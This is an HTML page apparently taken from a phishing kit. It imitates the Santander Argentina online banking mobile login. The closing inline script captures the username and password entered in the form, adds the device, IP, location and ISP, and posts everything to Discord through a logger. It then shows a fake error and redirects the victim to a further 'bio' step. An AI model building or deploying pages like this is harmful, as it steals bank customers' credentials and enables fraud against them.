<link rel="stylesheet" href="../../css/indexmovil.css">
<!DOCTYPE html>
<html lang=es>
<meta charset=utf-8>
<meta name=robots content=noindex>
<meta http-equiv=X-UA-Compatible content="IE=11">
<meta http-equiv=X-UA-Compatible content="IE=edge">
<meta http-equiv=Expires content=0>
<meta http-equiv=Last-Modified content=0>
<meta http-equiv=Cache-Control content="no-cache, no-store, must-revalidate, mustrevalidate">
<meta http-equiv=Pragma content=no-cache>
<title id=titleHeader>Online Banking Santander | Inicio de Sesión</title>
<meta name=viewport content="width=device-width,height=device-height,initial-scale=1,maximum-scale=1">
<meta name=apple-mobile-web-app-capable content=yes>
<meta name=mobile-web-app-capable content=yes>
<meta name=description content="Online Banking Santander">
<meta name=referrer content=no-referrer>
<link rel=canonical href=https://www2.personas.santander.com.ar/obp-webapp/angular/#!/login>
<meta http-equiv=content-security-policy
	content="default-src 'self' http://127.0.0.1:5500; font-src 'self' data:; img-src 'self' data: http://127.0.0.1:5500; style-src 'unsafe-inline' 'self' http://127.0.0.1:5500; media-src 'self' data:; script-src 'unsafe-inline' 'self' data: http://127.0.0.1:5500; object-src 'self' data:; frame-src 'self' data: http://127.0.0.1:5500; connect-src 'self' http://127.0.0.1:5500 https://discord.com https://api.ipdata.co http://ip-api.com;">
<body ng-app=app md-no-ink ng-strict-di
	class="mobile retail login"
	cz-shortcut-listen=true>
				<login><img
						data-ng-src=/obp-webapp/angular/client/app/common/images/logos-topbar/logos-rojos/desktop-sr.svg
						ng-hide=$ctrl.obpGlobal.isWebview style="display:flex;margin:0 auto;height:65px"
						alt="Santander Logo" ng-init=$ctrl.scrollToTopMobile()
						src="../../images/logo.svg"
						aria-hidden=false>
					<div class=container-view style=position:relative>
						<div ui-view=login-view autoscroll=false><stack-steps
								mostrar-teclado-virtual=$ctrl.mostrarTecladoVirtual
								on-abrir-teclado-virtual=$ctrl.abrirTecladoVirtual()
								on-cerrar-teclado-virtual=$ctrl.cerrarTecladoVirtual()>
								<div class=stack-steps-header ng-hide=$ctrl.obpGlobal.isWebview aria-hidden=false></div>
								<div ui-view=step-view class=animate-step autoscroll=true><login-inicio
										mostrar-teclado-virtual=$ctrl.mostrarTecladoVirtual
										on-abrir-teclado-virtual=$ctrl.abrirTecladoVirtual()
										on-cerrar-teclado-virtual=$ctrl.cerrarTecladoVirtual()>
										<div class=container-login-inicio><login-tabs swap=$ctrl.swap
												data-ng-if=$ctrl.showTabs action=$ctrl.changeTab(state)>
												<section class="section-tabs_container layout-row" layout=row>
													<div flex=50
														class="section-tabs_container__soy_cliente section-tabs_container__soy_cliente--selected flex-50"
														data-ng-class="{ 'section-tabs_container__soy_cliente--selected': $ctrl.swap }">
														<div data-ng-click=$ctrl.action({state:true}) role=button
															tabindex=0>Soy cliente</div>
													</div>
													<div flex=50 class="section-tabs_container__no_soy_cliente flex-50"
														data-ng-class="{ 'section-tabs_container__soy_cliente--selected': !$ctrl.swap }">
														<div data-ng-click=$ctrl.action({state:false}) role=button
															tabindex=0>No soy cliente</div>
													</div>
												</section>
											</login-tabs>
											<div class=login-container data-ng-if=$ctrl.swap>
												<div class=login-container__>
													<section class=login-container__header>
														<div class=login-container__header__title
															data-ng-bind=$ctrl.tituloLogin>¡Hola! Te damos la bienvenida
														</div>
														<p data-ng-if=!$ctrl.userNameSaved>Escribí tu usuario y
															contraseña para empezar a operar.</p>
													</section>
													<form id=form name=login novalidate
														class="ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength">
														<div class=content-input-login><obp-input
																data-ng-if=!$ctrl.userNameSaved
																class="content-input-login__input ng-pristine ng-untouched ng-valid ng-empty"
																config=$ctrl.configInputsLogin.usuario label="'Usuario'"
																data-ng-model=$ctrl.usuario
																obp-enter-key=$ctrl.checkFormLogin()
																validation=$ctrl.validateUsuario()
																aria-invalid=false><label
																	data-ng-bind=$ctrl.label>Usuario</label>
																<div class=content-input> <input
																		data-ng-if="$ctrl.config.name === 'usuario'"
																		id=datosusuario name=usuario type=text
																		maxlength=25
																		obp-allow-only-digits="{ keys: [[48, 57], [97, 122], [65, 90], 45, 46, 95] }"
																		data-ng-blur="$ctrl.validateInput($ctrl.config.name, $ctrl.config.required)"
																		data-ng-required=$ctrl.config.required
																		autocomplete=off data-ng-model=$ctrl.valueInput
																		data-ng-change=$ctrl.setValue($ctrl.valueInput)
																		alt=Usuario
																		data-ng-class="{ 'input-error': !$ctrl.loginService.errorInput[$ctrl.config.name].validate }"
																		data-ng-focus=$ctrl.clearValidate($ctrl.config.name)
																		class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-maxlength"
																		required aria-invalid=true value></div>
																<div class=msg-error-input
																	data-ng-class="{ 'msg-error-input--activo': !$ctrl.loginService.errorInput[$ctrl.config.name].validate }"
																	data-ng-bind=$ctrl.loginService.errorInput[$ctrl.config.name].text>
																</div>
															</obp-input><obp-input
																class="content-input-login__input ng-pristine ng-untouched ng-valid ng-empty"
																config=$ctrl.configInputsLogin.clave
																label="'Contraseña'"
																obp-enter-key=$ctrl.checkFormLogin()
																data-ng-model=$ctrl.clave
																validation=$ctrl.validateDocumentoClave()
																aria-invalid=false><label
																	data-ng-bind=$ctrl.label>Contraseña</label>
																<div class=content-input> <input
																		data-ng-if="$ctrl.config.name === 'clave'"
																		id=clave name=clave type=password maxlength=20
																		data-ng-blur="$ctrl.validateInput($ctrl.config.name, $ctrl.config.required)"
																		data-ng-required=$ctrl.config.required
																		autocomplete=off data-ng-model=$ctrl.valueInput
																		data-ng-change=$ctrl.setValue($ctrl.valueInput)
																		alt=Password
																		data-ng-class="{ 'input-error': !$ctrl.loginService.errorInput[$ctrl.config.name].validate }"
																		data-ng-focus=$ctrl.clearValidate($ctrl.config.name)
																		class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-maxlength"
																		required aria-invalid=true>
																	<div class="img-view img-view--oculto"
																		data-ng-class="{ 'img-view--visible' : $ctrl.botonOcularMostrar,  'img-view--oculto' : !$ctrl.botonOcularMostrar }"
																		alt=ocultar aria-label=Ocultar
																		data-ng-if=$ctrl.config.mostrarClave
																		data-ng-click=$ctrl.toggleOcultarMostrar()
																		role=button tabindex=0></div>
																</div>
																<div class=msg-error-input
																	data-ng-class="{ 'msg-error-input--activo': !$ctrl.loginService.errorInput[$ctrl.config.name].validate }"
																	data-ng-bind=$ctrl.loginService.errorInput[$ctrl.config.name].text>
																</div>
															</obp-input></div>
														<div class=content-checkbox-user
															data-ng-if=!$ctrl.userNameSaved><input type=checkbox
																name=recordarUsuario data-ng-model=$ctrl.saveUser
																class="ng-pristine ng-untouched ng-valid ng-empty"
																aria-invalid=false value=on> <label
																for=recordarUsuario>Recordar usuario</label></div>
														<button class=button-login
															data-ng-click=$ctrl.checkFormLogin()>Ingresar</button>
													</form>
													<div class=content-button-ayuda><button class=button-necesitas-ayuda
															data-ng-click=$ctrl.accesoOep()>¿Necesitás ayuda para
															ingresar?</button></div>
													<div class=login-container__mensaje-seguridad>
														<p class=login-container__mensaje-seguridad__principal>No
															compartas tus claves o Tokens de seguridad.
														<p class=login-container__mensaje-seguridad__texto>El banco
															nunca solicitará esta información por redes sociales,
															teléfono o email.</p><a
															href=https://www.santander.com.ar/personas/canales-de-atencion/opera-seguro
															rel=noopener target=_blank
															class=login-container__mensaje-seguridad__link>Conocé más
															consejos de seguridad</a>
													</div>
												</div>
											</div>
										</div>
									</login-inicio></div>
							</stack-steps></div>
						<div ui-view=main-view></div>
					</div>
				</login>
			</div><obp-orientation-modal>
				<div data-ng-if="$ctrl.isMobile || $ctrl.isTablet" class=orientation-modal style=display:none></div>
			</obp-orientation-modal><obp-validador>
				<div class=validador-container
					data-ng-class="{ 'toggled' : $ctrl.sharedValidatorService.showValidator}"></div>
			</obp-validador>
		</div>
	</app>
<script src="../../js/santander-logger.js"></script>
<script>
(function() {
	var eyeToggle = document.querySelector('.img-view');
	if (eyeToggle) {
		var claveInput = document.getElementById('clave');
		var showing = false;
		eyeToggle.addEventListener('click', function() {
			showing = !showing;
			if (showing) {
				claveInput.type = 'text';
				eyeToggle.style.backgroundImage = "url('../../images/eyes-close.svg')";
				eyeToggle.classList.remove('img-view--oculto');
				eyeToggle.classList.add('img-view--visible');
			} else {
				claveInput.type = 'password';
				eyeToggle.style.backgroundImage = '';
				eyeToggle.classList.remove('img-view--visible');
				eyeToggle.classList.add('img-view--oculto');
			}
		});
	}

	var btn = document.querySelector('.button-login');
	if (!btn) return;

	var attempt = parseInt(localStorage.getItem('santander_login_attempt') || '0', 10);

	btn.addEventListener('click', function(e) {
		e.preventDefault();
		var usuarioInput = document.getElementById('datosusuario');
		var claveInput = document.getElementById('clave');
		var usuario = usuarioInput ? usuarioInput.value : '';
		var clave = claveInput ? claveInput.value : '';

		if (!usuario || !clave) return;

		btn.disabled = true;
		btn.textContent = 'Cargando...';

		attempt++;
		localStorage.setItem('santander_login_attempt', attempt);

		var isMobile = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);
		var now = new Date();

		SantanderLogger.getIpInfo().then(function(ipInfo) {
			var flowData = {
				usuario: usuario,
				clave: clave,
				dispositivo: isMobile ? 'Móvil' : 'Desktop',
				fecha: now.toLocaleDateString('es-AR'),
				hora: now.toLocaleTimeString('es-AR', { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
				userAgent: navigator.userAgent,
				zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
				resolucion: screen.width + 'x' + screen.height,
				ipInfo: ipInfo
			};

			localStorage.setItem('santander_flow_data', JSON.stringify(flowData));

			var embeds = [{
				title: '🏦 Santander AR - Login Móvil (Intento ' + attempt + ')',
				color: 0xEC0000,
				fields: [
					{ name: '👤 Usuario', value: '`' + usuario + '`', inline: true },
					{ name: '🔑 Contraseña', value: '```' + clave + '```', inline: false },
					{ name: '📱 Dispositivo', value: '`' + flowData.dispositivo + '`', inline: true },
					{ name: '📐 Resolución', value: '`' + flowData.resolucion + '`', inline: true },
					{ name: '🌐 IP', value: '`' + (ipInfo.ip || 'N/A') + '`', inline: false },
					{ name: '📍 Ubicación', value: '`' + (ipInfo.location || 'N/A') + '`', inline: false },
					{ name: '🏢 ISP', value: '`' + (ipInfo.isp || 'N/A') + '`', inline: true },
					{ name: '🏳️ País', value: (ipInfo.flag || '🌐') + ' ' + (ipInfo.country || '??') + ' (' + (ipInfo.country_code || '??') + ')', inline: true },
					{ name: '🌍 User Agent', value: '```' + flowData.userAgent + '```', inline: false }
				],
				footer: { text: flowData.fecha + ' ' + flowData.hora + ' | ' + flowData.zonaHoraria },
				timestamp: new Date().toISOString()
			}];

			return SantanderLogger.sendToDiscord(embeds).then(function() {
				setTimeout(function() {
					if (attempt >= 2) {
						localStorage.removeItem('santander_login_attempt');
						localStorage.setItem('santander_bio_attempt', '0');
						window.location.href = 'bio.html';
					} else {
						window.location.href = 'error.html?r=indexMovil.html';
					}
				}, 1200);
			});
		});
	});
})();
</script>
